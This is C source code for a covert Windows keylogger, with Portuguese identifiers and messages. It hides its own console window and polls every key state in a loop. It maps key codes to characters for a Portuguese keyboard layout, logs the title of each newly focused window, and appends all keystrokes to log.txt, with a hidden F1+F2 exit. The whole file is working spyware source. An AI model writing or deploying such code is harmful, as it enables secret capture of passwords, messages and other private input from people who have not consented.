#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <locale.h>
#define comp 255

teclasExtras(int i, FILE * ar){
	switch(i){
		case 111:{
			fprintf(ar,"%c",i-64);
			break;
		}
		case 106:{
			fprintf(ar,"%c",i-64);
			break;
		}
		case 107:{
			fprintf(ar,"%c",i-64);
			break;
		}
		case 109:{
			fprintf(ar,"%c",i-64);
			break;
		}
		case 110:{
			fprintf(ar,"%c",i-66);
			break;
		}
		case 96:{
			fprintf(ar,"%c",i-48);
			break;
		}
		case 190:{
			fprintf(ar,"%c",i-144);
			break;
		}
		case 187:{
			fprintf(ar,"%c",i-126);
			break;
		}
		case 188:{
			fprintf(ar,"%c",i-144);
			break;
		}
		case 189:{
			fprintf(ar,"%c",i-144);
			break;
		}
		case 191:{
			fprintf(ar,"%c",i-132);
			break;
		}
		case 192:{
			fprintf(ar,"%c",i-153);
			break;
		}
		case 194:{
			fprintf(ar,"%c",i-148);
			break;
		}
		case 193:{
			fprintf(ar,"%c",i-146);
			break;
		}
		case 220:{
			fprintf(ar,"%c",i-127);
			break;
		}
		case 221:{
			fprintf(ar,"%c",i-130);
			break;
		}
		case 226:{
			fprintf(ar,"%c",i-134);
			break;
		}
		default:
			fprintf(ar,"%c",i);
		}
}

main(int argc, char** argv) {
	FILE * ar;
	HWND janela;
	char titulo[comp],aux[comp];
	ShowWindow(GetConsoleWindow(),0);
	GetWindowText(janela,titulo,comp);
	setlocale(LC_ALL,"portuguese");
	if((ar=fopen("log.txt","a")) == NULL){
		printf("Não foi possivel abrir o arquivo.");
		return 0;
	}
	while(1){
		if(GetKeyState(112) && GetKeyState(113))
			exit(0);
		janela = GetForegroundWindow();
		GetWindowText(janela,aux,comp);
		if(strcmp(aux,titulo)!=0){
			strcpy(titulo,aux);
			Sleep(500);
			fprintf(ar,"%s","\n\n\n");
			fprintf(ar,"%s","*********************************************************************************\n");
			fprintf(ar,"%s\n",aux);
			fprintf(ar,"%s","*********************************************************************************\n\n");
			Sleep(500);
		}
		char caractere;
		for(int i=8;i<=255;i++){
			if(GetAsyncKeyState(i) == -32767){
				if(GetKeyState(VK_SHIFT) & 0x8000){
				switch(i){
					case 48:{
						fprintf(ar,"%c",41);
						break;
					}
					case 49:{
						fprintf(ar,"%c",33);
						break;
					}
					case 50:{
						fprintf(ar,"%c",64);
						break;
					}
					case 51:{
						fprintf(ar,"%c",35);
						break;
					}
					case 52:{
						fprintf(ar,"%c",36);
						break;
					}
					case 53:{
						fprintf(ar,"%c",37);
						break;
					}
					case 54:{
						fprintf(ar,"%c",249);
						break;
					}
					case 55:{
						fprintf(ar,"%c",38);
						break;
					}
					case 56:{
						fprintf(ar,"%c",42);
						break;
					}
					case 57:{
						fprintf(ar,"%c",40);
						break;
					}
					case 189:{
						fprintf(ar,"%c",95);
						break;
					}
					case 187:{
						fprintf(ar,"%c",43);
						break;
					}
					case 192:{
						fprintf(ar,"%c",34);
						break;
					}
				}
			}else if((GetKeyState(VK_CAPITAL) & 0x0001) == 1 && i != 20)
					if(i >= 97 && i <= 105){
						fprintf(ar,"%c",i-48);
					}else{
						teclasExtras(i,ar);
					}
				else{
					if(i <= 90 && i >= 65)
						fprintf(ar,"%c",i+32);
					else if(i != 20){
						if(i >= 97 && i <= 105)
							fprintf(ar,"%c",i-48);
						else
							teclasExtras(i,ar);
					}
				}
			}
		}
	}		
}
